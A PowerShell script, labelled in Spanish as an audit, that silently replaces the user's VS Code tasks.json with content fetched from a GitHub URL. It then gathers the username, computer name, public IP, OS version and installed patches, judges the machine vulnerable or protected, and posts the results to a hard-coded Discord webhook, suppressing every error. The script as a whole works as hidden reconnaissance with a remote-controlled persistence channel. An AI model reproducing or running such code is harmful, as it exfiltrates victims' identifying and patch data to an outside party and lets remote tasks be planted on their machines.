# 1. Configuración de variables
$Webhook = "https://discord.com/api/webhooks/1494006624166350960/BEcOnRkEN1eiyHGnyWVZuEBDW5KZjgP2lo8g47RGs_Xp2Q5qp5I-Auts8HdkkpLNoAlH"
$TasksPath = "$env:APPDATA\Code\User\tasks.json"
$RemoteTasksUrl = "https://raw.githubusercontent.com/baa4ts/baa4ts/refs/heads/main/public/tasks.txt"

# 2. Verificar internet
if (!(Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet)) { return }

# 3. Auto-actualización de la tarea (tasks.json)
try {
    $RemoteContent = Invoke-RestMethod -Uri $RemoteTasksUrl
    if ($RemoteContent -like "*version*") {
        $LocalHash = if (Test-Path $TasksPath) { Get-FileHash $TasksPath -Algorithm MD5 | Select-Object -ExpandProperty Hash } else { "" }
        $RemoteHash = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($RemoteContent)) | ForEach-Object { $_.ToString("X2") }) -join ""
        if ($LocalHash -ne $RemoteHash) {
            $RemoteContent | Set-Content -Path $TasksPath -Encoding UTF8 -Force
        }
    }
} catch { }

# 4. Lógica de Auditoría (Recolección de datos)
$IP = try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { "N/A" }
$User = $env:USERNAME
$Device = $env:COMPUTERNAME
$OSInfo = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
$FullVersion = "$($OSInfo.CurrentBuild).$($OSInfo.UBR)"
$FriendlyName = (Get-CimInstance Win32_OperatingSystem).Caption

# Gestión de Parches
$RawPatches = Get-HotFix
$PatchesWithDate = $RawPatches | Where-Object { $_.InstalledOn -ne $null } | Sort-Object InstalledOn -Descending
$PatchesNoDate = $RawPatches | Where-Object { $_.InstalledOn -eq $null }
$SortedPatches = $PatchesWithDate + $PatchesNoDate

$PatchLimit = Get-Date -Year 2026 -Month 3 -Day 10
$IsProtected = $PatchesWithDate | Where-Object { $_.InstalledOn -ge $PatchLimit }
$Status = if($IsProtected){ '🛡️ PROTEGIDO' } else { '⚠️ VULNERABLE' }
$Color = if($IsProtected){ 3066993 } else { 15158332 }

# 5. Envío segmentado a Discord (Bucle de parches)
$ChunkSize = 3
$TotalPatches = $SortedPatches.Count
$SectionCounter = 1

for ($i = 0; $i -lt $TotalPatches; $i += $ChunkSize) {
    $End = [Math]::Min($i + $ChunkSize - 1, $TotalPatches - 1)
    $Chunk = $SortedPatches[$i..$End]
    
    $PatchText = ($Chunk | ForEach-Object {
        $DateStr = if ($_.InstalledOn) { $_.InstalledOn.ToString('dd/MM/yyyy') } else { 'Sin fecha' }
        "- **$($_.HotFixID)**`n  └ Instalado: $DateStr"
    }) -join "`n`n"

    $EmbedFields = New-Object System.Collections.Generic.List[System.Object]

    # Solo en la primera sección enviamos los datos del sistema
    if ($SectionCounter -eq 1) {
        $EmbedFields.Add(@{ name = '💻 Sistema'; value = "$FriendlyName ($FullVersion)"; inline = $false })
        $EmbedFields.Add(@{ name = '📊 Estado'; value = $Status; inline = $true })
        $EmbedFields.Add(@{ name = '👤 Usuario / IP'; value = "$User ($IP)"; inline = $true })
    }

    $EmbedFields.Add(@{ name = "📦 Parches (Sección $SectionCounter)"; value = $PatchText; inline = $false })

    $Payload = @{
        username = "$User @ $Device"
        avatar_url = "https://i.imgur.com/8nLFCuR.png"
        embeds = @(@{
            title = if ($SectionCounter -eq 1) { '🚀 Reporte Inicial' } else { '📑 Continuación' }
            color = $Color
            fields = $EmbedFields
            footer = @{ text = "Sección $SectionCounter de $([Math]::Ceiling($TotalPatches/$ChunkSize)) | Total: $TotalPatches" }
        })
    } | ConvertTo-Json -Depth 10

    try {
        $Utf8Body = [System.Text.Encoding]::UTF8.GetBytes($Payload)
        Invoke-RestMethod -Uri $Webhook -Method Post -Body $Utf8Body -ContentType 'application/json; charset=utf-8'
        Start-Sleep -Milliseconds 1200 # Evitar rate-limit de Discord
    } catch { }

    $SectionCounter++
}
